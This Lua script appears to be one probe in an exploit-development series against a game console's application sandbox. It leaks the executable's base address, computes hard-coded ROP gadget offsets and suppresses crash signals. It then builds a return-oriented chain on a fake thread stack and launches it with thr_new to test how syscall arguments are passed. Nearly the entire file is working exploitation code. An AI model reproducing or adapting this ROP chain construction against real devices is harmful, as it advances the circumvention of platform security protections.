-- CRASH_CLASS: MODERATE
-- PROBE 552a: fourth argument plumbing, decided by a visible count write
--
-- Context: 549a's child ran but the sysctl out buffers stayed untouched, and
-- 551a could not capture the child's return value (no `mov [rdi],rax` gadget
-- in the first 0x90000 bytes of eboot). This probe avoids needing RAX:
--
--   [M] the child first locks a umtx, so the owner word proves the chain ran;
--   [B] it then calls sys 674 with the count pointer in the FOURTH argument
--       (RCX). If the loader stub moves RCX into R10 the count is written.
--
-- The parent does the same 674 call directly as a control.

print("=== PROBE 552a: CHAIN ARG4 VIA 674 ===")
print("")
local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("[0] pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_pop_rcx  = eb + 0xE64
local g_bare_ret = eb + 0x42

local sigact = memory.alloc(0x20)
wq(N(sigact), uint64(1))
wd(N(sigact) + 8, 0)
wq(N(sigact) + 16, uint64(0))
pcall(function() mk(416)(uint64(11), sigact, uint64(0)) end)
pcall(function() mk(416)(uint64(12), sigact, uint64(0)) end)

local fake_tcb = memory.alloc(0x1000)
local tcb_a = N(fake_tcb)
for i = 0, 0xFFC, 4 do wd(tcb_a + i, 0) end
for i = 0, 0xFF8, 8 do wq(tcb_a + i, uint64(tcb_a)) end
local fs_ptr = memory.alloc(8)
wq(N(fs_ptr), uint64(tcb_a))
local function emit_sysarch_preamble(emit)
    emit(g_pop_rdi);   emit(uint64(129))
    emit(g_pop_rsi);   emit(uint64(N(fs_ptr)))
    emit(g_pop_rax);   emit(uint64(165))
    emit(stub)
end

local rbuf = memory.alloc(72 * 40)
local countp = memory.alloc(8)
local sc674 = mk(674)

-- [A] control from the parent
wd(N(countp), 0xDEADBEEF); wd(N(countp) + 4, 0)
for i = 0, 72 * 40 - 4, 4 do wd(N(rbuf) + i, 0) end
local arv = N(sc674(uint64(N(rbuf)), uint64(72), uint64(40),
    uint64(N(countp)), uint64(0x40000000)))
print(string.format("[A] parent 674 ret=%d count=%d", arv, rd(N(countp)) or -1))

-- [B] the child
local M = memory.alloc(0x20)
for i = 0, 0x1C, 4 do wd(N(M) + i, 0) end
local cbuf = memory.alloc(72 * 40)
for i = 0, 72 * 40 - 4, 4 do wd(N(cbuf) + i, 0) end
wd(N(countp), 0xDEADBEEF); wd(N(countp) + 4, 0)

local sc_thr_new = mk(455)
local CHAIN_MAX = 0x8000
local stk = memory.alloc(0x8000 + CHAIN_MAX)
local sb = N(stk)
local ss = 0x8000
local rsp = sb + ss - 8
local off = 0
local function emit(v) wq(rsp + off, v); off = off + 8 end

emit_sysarch_preamble(emit)
-- [M] lock the umtx: the owner word will show the chain executed
emit(g_pop_rdi); emit(uint64(N(M)))
emit(g_pop_rsi); emit(uint64(5))
emit(g_pop_rdx); emit(uint64(0))
emit(g_pop_rax); emit(uint64(454))
emit(stub)
-- [B] 674 with the count pointer in RCX
emit(g_pop_rdi); emit(uint64(N(cbuf)))
emit(g_pop_rsi); emit(uint64(72))
emit(g_pop_rdx); emit(uint64(40))
emit(g_pop_rcx); emit(uint64(N(countp)))
emit(g_pop_rax); emit(uint64(674))
emit(stub)
emit(g_pop_rdi); emit(uint64(0))
emit(g_pop_rax); emit(uint64(431))
emit(stub)

local par = memory.alloc(0x40)
local pa = N(par)
for i = 0, 0x3C, 4 do wd(pa + i, 0) end
wq(pa + 0x00, g_bare_ret)
wq(pa + 0x08, uint64(0))
wq(pa + 0x10, uint64(sb))
wq(pa + 0x18, uint64(ss))
local tid_ptr = memory.alloc(8)
wq(N(tid_ptr), uint64(0))
wq(pa + 0x30, tid_ptr)

print(string.format("[B] chain bytes=%d", off))
local ok, trv = pcall(function() return sc_thr_new(par, uint64(0x38)) end)
print(string.format("[C] thr_new ok=%s rv=%s", tostring(ok), tostring(N(trv))))
for i = 1, 900000 do end
local tid = rd(N(tid_ptr)) or 0
print(string.format("[D] child tid=%d umtx owner=%08X count=%d rec[0..8]=%08X %08X alive=%s",
    tid, rd(N(M)) or 0, rd(N(countp)) or -1,
    rd(N(cbuf)) or 0, rd(N(cbuf) + 8) or 0, tostring(alive())))
print("=== DONE ===")
